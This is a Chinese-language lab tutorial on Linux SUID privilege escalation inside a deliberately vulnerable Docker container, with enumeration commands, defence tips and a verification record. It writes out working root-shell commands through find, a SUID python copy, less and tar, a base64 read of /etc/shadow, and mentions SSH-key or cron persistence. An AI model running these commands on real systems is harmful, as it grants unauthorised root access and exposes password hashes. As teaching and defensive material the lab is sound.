# SUID 提权

## 原理

SUID（Set User ID）：文件带 SUID 位（权限 `-rwsr-xr-x`）时，任何用户运行它，
进程的**有效用户 ID（euid）变成文件属主**（通常是 root）。若该程序允许执行外部
命令（find 的 -exec、vim 的 :! / python 接口）或存在漏洞，普通用户就能借它提权。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：find / vim.basic / less / base64 / python3suid 设置 SUID 位

## 复现步骤

利用文件已预置在容器内 /opt/exploits（属主 lowpriv，可读可写可执行），**全程在容器内操作**。

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/suid        # Kali 宿主机
docker compose up -d --build            # 构建并启动
docker exec -it suid su - lowpriv   # 进入容器 (密码 lowpriv123)
```

### 第二步：容器内确认漏洞环境

```bash
id                      # uid=1000(lowpriv) gid=1000(lowpriv)
sudo -l                 # 查看漏洞配置
ls -la /opt/exploits/   # 预置的漏洞利用文件 (源码/编译脚本/一键利用)
```

### 第三步：容器内利用（利用文件已预置在 /opt/exploits）

```bash
cd /opt/exploits

# 1. find 提权
/usr/bin/find . -exec /bin/sh -p -c 'id' \; -quit
# 预期: euid=0(root)

# 2. python3 (SUID 副本) 提权
/usr/local/bin/python3suid -c 'import os; os.setuid(0); os.system("id")'
# 预期: uid=0(root)

# 3. base64 读任意文件
/usr/bin/base64 /etc/shadow | base64 -d
# 预期: 输出 shadow 哈希

# 4. less 提权 (交互)
less /etc/shadow
# 在 less 界面输入: !/bin/sh    得到 root shell
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 手动利用（分步教学）

### 第一步：发现 SUID 文件（枚举）

```bash
find / -perm -4000 -type f 2>/dev/null
```

`-perm -4000` 匹配权限位中设置了 SUID（4000）的文件。
看输出：`/usr/bin/find`、`/usr/local/bin/python3suid`、`/usr/bin/less`、`/usr/bin/base64`
——这些程序**不该有 SUID**，属主却是 root，就是提权点。

判断技巧：`ls -l` 中权限位显示 `-rwsr-xr-x` 的 `s` 就是 SUID 位。

### 第二步：理解 SUID 原理

| 概念 | 说明 |
|:---|:---|
| 真实 UID (ruid) | 进程属于谁（发起用户） |
| 有效 UID (euid) | 进程以谁的权限运行（决定能否访问 root 文件） |
| SUID 程序 | 运行时 euid = 文件属主（root），ruid 不变 |

普通程序：ruid = euid = lowpriv；SUID root 程序：ruid=lowpriv，**euid=0**。

### 第三步：find 提权

```bash
/usr/bin/find . -exec /bin/sh -p -c 'id' \; -quit
```

find 以 euid=0 运行 → `-exec` 启动的 /bin/sh 继承 euid=0 → `-p` 让 shell **保留**
euid 不降权 → 得到 root 权限的 shell。

### 第四步：python3（SUID 副本）提权

```bash
/usr/local/bin/python3suid -c 'import os; os.setuid(0); os.system("id")'
```
进程 euid=0 → `os.setuid(0)` 成功 → uid=0。

### 第五步：less 交互提权

```bash
less /etc/shadow
# 在 less 界面输入: !/bin/sh   (less 的 ! 命令以 euid 执行)
```

less/more/man 的 `!` 命令允许执行 shell，且不降权。

### 第六步：base64 读任意文件

```bash
/usr/bin/base64 /etc/shadow | base64 -d
```
无 shell 提权时，SUID base64 可读任意 root 文件（信息收集）。

> 完整命令参考：GTFOBins SUID 分类。

为什么能成功

| 程序 | 原理 |
|:---|:---|
| find | euid=0 运行, `-exec` 执行 `/bin/sh -p`, -p 保留有效用户 ID |
| python3suid | `os.setuid(0)` 在 euid=0 的进程内设置真实 UID |
| less/more/man | 界面内 `!` 命令以 euid 执行 shell |
| base64 | 读任意文件（无 shell 提权, 但可窃取 shadow 等敏感文件） |

## 防御

- `find / -perm -4000` 定期审计 SUID 文件
- 去除不必要 SUID 位, 使用 capabilities 替代并同样审计
- 参考 GTFobins 排查可被滥用的程序


## 扩展教学（网络搜索整理）

### 高危 SUID 程序速查

| 类别 | 程序 | 提权方式 |
|:---|:---|:---|
| 编辑器 | vim/nano/vi | `:!bash` / Ctrl+R Ctrl+X |
| 解释器 | python/perl/ruby | `os.setuid(0)` / `exec "/bin/bash"` |
| 分页器 | less/more | 界面内 `!/bin/bash` |
| 文件工具 | find | `-exec /bin/sh -p` |
| 网络工具 | nmap（老版本） | `--interactive` → `!sh` |
| 文件查看 | base64/tail/head | 读任意 root 文件 |
| 归档 | tar | `--checkpoint-action=exec` |

### GTFOBins 自动化交叉检查

```bash
# 找出系统上所有 SUID 程序并提示查 GTFOBins
for i in $(find / -type f -perm -4000 2>/dev/null | xargs basename | sort -u); do
    echo "Check GTFOBins for: $i"
done

# 或只找高危名单
find / -type f -perm -4000 2>/dev/null | grep -E '(nano|vim|vi|find|python|less|more|tail|head|awk|sed|nmap|base64|tar)'
```

### 攻击路径视角（MITRE）

SUID 提权对应完整攻击链：
发现（T1083 File and Directory Discovery）→ 查 GTFOBins → 弹 shell
（T1059 Command and Scripting Interpreter）→ 持久化（写 SSH key / cron）

### 防御

- 定期 `find / -perm -4000` 审计并对比基线
- 用 capabilities 替代部分 SUID（并同样用 getcap 审计）
- 高危程序（解释器/编辑器）绝不加 SUID

## 验证记录

2026-08-26 真实环境验证：find 提权输出 `euid=0(root)`，python3suid 输出 `uid=0(root)`，
base64 成功读取 root 哈希。复现成功。
